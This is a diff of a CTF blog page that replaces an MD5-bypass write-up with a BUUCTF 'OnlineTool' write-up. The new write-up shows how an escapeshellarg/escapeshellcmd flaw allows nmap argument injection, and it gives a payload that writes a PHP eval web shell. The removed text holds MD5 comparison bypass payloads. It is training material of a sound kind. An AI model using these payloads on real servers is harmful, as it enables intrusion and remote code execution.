@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>BJDCTF2nd-EasyMd5 | 大周&#39;blog</title>
+  <title>BUUCTF2018-OnlineTool | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -223,6 +223,34 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
 <div class="pattern-center-blank"></div>
 
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.4/img/banner/comment.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      BUUCTF2018-OnlineTool</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="">
+          </a>
+        </span>
+        <span>
+          <a href=""></a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-7-15
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
+    </header>
+  </div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -230,39 +258,34 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
         
-          <header class="entry-header">
-            <h1 class="entry-title">BJDCTF2nd-EasyMd5</h1>
-            <p class="entry-census">&nbsp;·&nbsp;2020-7-13&nbsp;
-              
-                    
-        ·<span id="readcount"></span>次阅读
-      
-            </p>
-            <hr>
-          </header>
-        
         <div class="entry-content">
           <p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p>
 <a id="more"></a>
 
-<p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/1.png" alt="1"></p>
-<p>在HTTP头里发现Hint: select * from ‘admin’ where password=md5($pass,true)</p>
-<p>关于md5($pass,true)</p>
-<p>参考：<a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a></p>
-<p>输入ffifdyop</p>
-<p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/2.png" alt="2"></p>
-<p>查看源文件，发现</p>
-<pre><code>&lt;!--
-$a = $GET[&#39;a&#39;];
-$b = $_GET[&#39;b&#39;];
-
-if($a != $b &amp;&amp; md5($a) == md5($b)){
-    // wow, glzjin wants a girl friend.
---&gt;
-</code></pre><p>md5 bypass</p>
-<p>因为<code>md5()</code>或者<code>sha1()</code>之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果<code>$a</code>和<code>$b</code>都是数组则双双返回FALSE, 两个FALSE相等得以绕过。payload:<code>?a[]=1&amp;b[]=2</code></p>
-<p><img src="/2020/07/13/BJDCTF2nd-EasyMd5/3.png" alt="3"></p>
-<p>POST方式传<code>?param1[]=1&amp;param2[]=2</code></p>
+<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p>
+<p>总体意思就是GET方式传递参数给host然后经过两个函数<code>escapeshellarg</code>和<code>escapeshellcmd</code>，最后执行<code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code></p>
+<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p>
+<p>函数作用</p>
+<pre><code>1,确保用户值传递一个参数给命令
+2,用户不能指定更多的参数
+3,用户不能执行不同的命令</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p>
+<p>函数作用</p>
+<pre><code>1,确保用户只执行一个命令
+2,用户可以指定不限数量的参数
+3,用户不能执行不同的命令</code></pre><p>题目提示给了PHP和RCE</p>
+<p><img src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p>
+<p>这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https:/<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener"></a>/paper.seebug.org/164/</p>
+<ol>
+<li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li>
+<li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li>
+<li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li>
+<li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li>
+</ol>
+<p>接下来就是构造命令</p>
+<pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p>
+<p>文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php</p>
+<p>蚁剑连接后在根目录找到flag</p>
+<p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -284,39 +307,20 @@ if($a != $b &amp;&amp; md5($a) == md5($b)){
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/07/14/RoarCTF2019-EasyJava/" rel="prev">
-              <div class="background">
-<!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
-                
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/e9f33c2c502ab43804964ce7edd431f9.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                RoarCTF2019-EasyJava</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/07/13/BJDCTF2nd-fakegoogle/" rel="next">
+            <a href="/2020/07/14/RoarCTF2019-EasyJava/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/a5fa4f9db760f58fc48f03d66b4967f7.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                BJDCTF2nd-fakegoogle</h3>
+                RoarCTF2019-EasyJava</h3>
                 <hr>
               </div>
             </a>
